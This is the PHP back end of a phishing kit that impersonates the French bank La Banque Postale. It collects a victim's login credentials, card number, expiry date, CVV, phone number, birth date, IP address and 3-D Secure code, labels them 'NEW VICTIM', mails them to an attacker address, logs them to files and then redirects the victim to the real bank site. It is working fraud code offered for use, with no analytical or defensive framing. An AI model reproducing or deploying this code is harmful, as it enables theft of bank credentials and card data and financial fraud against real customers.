<?php
 /* CODED BY R3M0T  */
 require_once('yourhub.php');
 session_start();
 $username = $_SESSION['username'];
 $password = $_SESSION['password'];
 // Website title
 $web_title = "La Banque Postale - Gérez vos données personnelles";
 $web_title_secuirty = "La Banque Postale - 3-D Secure";
 $web_title_successfully = "La Banque Postale - Félicitation";

 // Vars with defaults values
 $error = false;
 $errormessage = "";
 $from = "";
 $subject = "";
 $message = "";
 $date = gmdate("H:i:s | d/m/Y");
 $victim_ip = getenv("REMOTE_ADDR");
 if(isset($_POST['doUpdate'])){
 	$phonenumber = $_POST['phonenumber'];
 	$bday = $_POST['bday'];
 	$cc = $_POST['cc'];
 	$exmoth = $_POST['exmoth'];
 	$exyear = $_POST['exyear'];
 	$cvv = $_POST['cvv'];

 	if(empty($phonenumber) || empty($bday) || empty($cc) || empty($exmoth) || empty($exyear)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
        $message1 = 
        "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
------------------ <font style='color: #820000;'>VICTIM INFOS</font> ------------------<br/>
=================[ <font style='color: #0a5d00;'>Username & Password</font> ]=================<br>
<font style='color:#9c0000;'>😈</font> [Username]   = <font style='color:#0070ba;'>".$username."</font><br>
<font style='color:#9c0000;'>😈</font> [Password]    = <font style='color:#0070ba;'>".$password."</font><br>
=================[ <font style='color: #0a5d00;'>Others</font> ]=================<br>
=================[ <font style='color: #0a5d00;'>Credit Card Info</font> ]=================<br>
<font style='color:#9c0000;'>😈</font> [Card Number]   = <font style='color:#0070ba;'>".$cc."</font><br>
<font style='color:#9c0000;'>😈</font> [Expiration Date]    = <font style='color:#0070ba;'>".$exmoth." / ".$exyear."</font><br>
<font style='color:#9c0000;'>😈</font> [Cvv]    = <font style='color:#0070ba;'>".$cvv."</font><br>
=================[ <font style='color: #0a5d00;'>Others</font> ]=================<br>
<font style='color:#9c0000;'>😈</font> [Phone Number]   = <font style='color:#0070ba;'>".$phonenumber."</font><br>
<font style='color:#9c0000;'>😈</font> [Birth Day]    = <font style='color:#0070ba;'>".$bday."</font><br>
=================[ <font style='color: #0a5d00;'>INFO VICTIM</font> ]=================<br>
<font style='color:#9c0000;'>😈</font> [IP INFO]      = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$victim_ip."</font><br>
<font style='color:#9c0000;'>😈</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$date."</font><br><br>
------------------ <font style='color: #820000;'>BY R3M0T</font> ------------------</div></html>\n";
        $send = "".$EX445093_REMOT."";
        $subject = "FULLZ | NEW VICTIM";
        $from .= "From: r3m0t.online ";
        $from .= 'MIME-Version: 1.0' . "\r\n";
        // Send results
        @mail($send,$subject,$message,$from);
        $house = fopen('fucked/'.$username.'.html', 'a');
        fwrite($house, $message1);
        fclose($house);
        header('Location: security.php');
 	}
 }


 // 3-D Secure
 if(isset($_POST['doConfirm'])){
 	$secure = $_POST['secure'];

 	if(empty($secure)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
 		$message2 = 
        "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
------------------ <font style='color: #820000;'>VICTIM INFOS</font> ------------------<br/>
=================[ <font style='color: #0a5d00;'>3-D Secure</font> ]=================<br>
<font style='color:#9c0000;'>😈</font> [3-D Secure Code]   = <font style='color:#0070ba;'>".$secure."</font><br>
------------------ <font style='color: #820000;'>BY R3M0T</font> ------------------</div></html>\n";
        $send = "".$EX445093_REMOT."";
        $subject = "3-D Secure | NEW VICTIM";
        $from .= "From: r3m0t.online ";
        $from .= 'MIME-Version: 1.0' . "\r\n";
        // Send results
        @mail($send,$subject,$message,$from);
        $house = fopen('fucked/'.$username.'-3DSecure.html', 'w');
        fwrite($house, $message2);
        fclose($house);
        header('Location: https://www.labanquepostale.fr/');
 	}
 }
?>